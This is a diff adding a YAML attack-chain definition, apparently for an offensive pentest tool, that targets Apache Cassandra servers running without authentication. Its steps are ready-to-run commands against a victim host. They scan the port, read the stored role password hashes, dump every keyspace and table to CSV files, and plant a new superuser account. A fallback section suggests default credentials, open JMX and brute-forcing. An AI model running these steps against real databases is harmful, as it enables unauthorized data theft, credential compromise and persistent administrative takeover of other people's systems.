@@ -1,0 +1,69 @@
+chain_id: cassandra_default_no_auth
+title: "Apache Cassandra — default AllowAllAuthenticator → unauth dump + admin"
+severity: HIGH
+tags: [cassandra, nosql, default-config, info-leak, post-exploit]
+
+trigger:
+  any_of:
+    - { kind: "cassandra_no_auth" }
+    - { service_pattern: "(?i)cassandra|cql" }
+    - { banner_pattern: "(?i)cassandra" }
+    - { port_in: [9042, 9160, 7000, 7199] }
+
+description: |
+  Cassandra's default `cassandra.yaml` ships with
+  `authenticator: AllowAllAuthenticator` — anyone who reaches CQL on
+  9042 or Thrift on 9160 is implicitly authenticated. Common in dev
+  clusters that get promoted to prod, internal-only deployments
+  exposed by a misconfigured firewall, and Docker images run with
+  `-p 9042:9042`. Pull every keyspace, dump every secret, swap the
+  password hashes with your own.
+
+steps:
+  - id: 1
+    title: "Confirm CQL is open"
+    command: |
+      nmap -sV -p 9042 $VICTIMA
+      cqlsh $VICTIMA 9042
+      # If it lands on the cqlsh> prompt with no auth → vulnerable.
+
+  - id: 2
+    title: "Enumerate keyspaces and tables"
+    command: |
+      cqlsh $VICTIMA 9042 -e 'DESCRIBE KEYSPACES'
+      cqlsh $VICTIMA 9042 -e 'DESCRIBE KEYSPACE system_auth'
+      cqlsh $VICTIMA 9042 -e 'SELECT * FROM system_auth.roles' --output csv
+
+  - id: 3
+    title: "Dump every keyspace to disk"
+    command: |
+      for ks in $(cqlsh $VICTIMA 9042 -e 'DESCRIBE KEYSPACES' | tr ' ' '\\n' | grep -v -E '^(system|system_auth|system_schema|system_traces)$'); do
+        cqlsh $VICTIMA 9042 -e "DESCRIBE KEYSPACE $ks" > $ks.cql
+        for tbl in $(cqlsh $VICTIMA 9042 -e "USE $ks; DESCRIBE TABLES" | tr -s ' \\n' '\\n' | grep -v '^$'); do
+          cqlsh $VICTIMA 9042 -e "SELECT * FROM $ks.$tbl" --output csv > $ks-$tbl.csv
+        done
+      done
+
+  - id: 4
+    title: "Re-set the cassandra superuser hash"
+    command: |
+      # Generate a new bcrypt hash:
+      python3 -c "import bcrypt; print(bcrypt.hashpw(b'Rootctl123!', bcrypt.gensalt(10)).decode())"
+      cqlsh $VICTIMA 9042 -e "INSERT INTO system_auth.roles (role,can_login,is_superuser,salted_hash) VALUES ('rootctl', true, true, '<bcrypt-hash>')"
+
+  - id: 5
+    title: "If only Thrift (9160) is reachable, fall back to nodetool"
+    command: |
+      nodetool -h $VICTIMA status
+      nodetool -h $VICTIMA describering some_keyspace
+
+common_errors:
+  - error: "cqlsh: 'AuthenticationFailed'"
+    solution: |
+      `PasswordAuthenticator` is enabled. Try Cassandra default
+      creds (cassandra:cassandra), `JMX` on 7199 (often left auth-less
+      even when CQL is locked down), or brute via cqlsh in a loop.
+
+references:
+  - https://cassandra.apache.org/doc/latest/cassandra/operating/security.html
+  - https://book.hacktricks.xyz/network-services-pentesting/9042-9160-cassandra
